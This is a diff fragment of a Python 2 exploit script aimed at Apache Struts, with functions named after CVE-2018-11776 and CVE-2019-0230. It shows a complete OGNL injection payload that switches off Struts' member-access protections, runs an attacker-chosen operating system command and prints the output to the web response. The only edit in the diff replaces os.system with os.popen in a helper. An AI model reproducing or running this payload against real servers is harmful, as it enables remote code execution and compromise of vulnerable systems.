@@ -193,7 +193,7 @@ def CVE_2018_11776(comando):
 def CVE_2019_0230(comando):
 	return "id=%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('"+ comando + "').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()}"
 def printx(x):
-    os.system(x)
+    os.popen(x)
 
 def identTools():
 	print "   ACTIVE SYSTEM TOOLS:"
